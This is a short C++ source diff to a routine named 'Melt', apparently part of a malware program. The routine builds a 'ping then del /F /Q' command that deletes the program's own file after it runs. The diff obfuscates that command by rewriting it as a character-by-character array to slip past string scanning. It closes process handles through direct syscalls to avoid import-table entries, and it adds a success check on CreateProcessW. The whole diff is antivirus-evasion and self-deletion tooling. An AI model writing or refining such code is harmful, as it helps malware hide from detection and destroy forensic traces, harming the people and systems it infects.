@@ -45,7 +45,7 @@ namespace Melt
         SecureZeroMemory(cmd, sizeof(cmd));
         int pos = 0;
 
-        const wchar_t prefix[] = L"cmd.exe /C ping 127.0.0.1 -n 3 > nul & del /F /Q \"";
+        wchar_t prefix[] = { L'c',L'm',L'd',L'.',L'e',L'x',L'e',L' ',L'/',L'C',L' ',L'p',L'i',L'n',L'g',L' ',L'1',L'2',L'7',L'.',L'0',L'.',L'0',L'.',L'1',L' ',L'-',L'n',L' ',L'3',L' ',L'>',L' ',L'n',L'u',L'l',L' ',L'&',L' ',L'd',L'e',L'l',L' ',L'/',L'F',L' ',L'/',L'Q',L' ',L'"', 0 };
         for (int i = 0; prefix[i] && pos < 510; i++)
             cmd[pos++] = prefix[i];
 
@@ -64,7 +64,7 @@ namespace Melt
 
         PROCESS_INFORMATION pi = { 0 };
 
-        pCreateProcessW(
+        BOOL bCreated = pCreateProcessW(
             NULL,
             cmd,
             NULL, NULL, FALSE,
@@ -74,7 +74,10 @@ namespace Melt
         );
 
         // Close handles via Syscall::NtClose (no IAT entry)
-        if (pi.hProcess) Syscall::NtClose(pi.hProcess);
-        if (pi.hThread)  Syscall::NtClose(pi.hThread);
+        // Only close if CreateProcessW succeeded — otherwise handles are zero/invalid
+        if (bCreated) {
+            if (pi.hProcess) Syscall::NtClose(pi.hProcess);
+            if (pi.hThread)  Syscall::NtClose(pi.hThread);
+        }
     }
 }
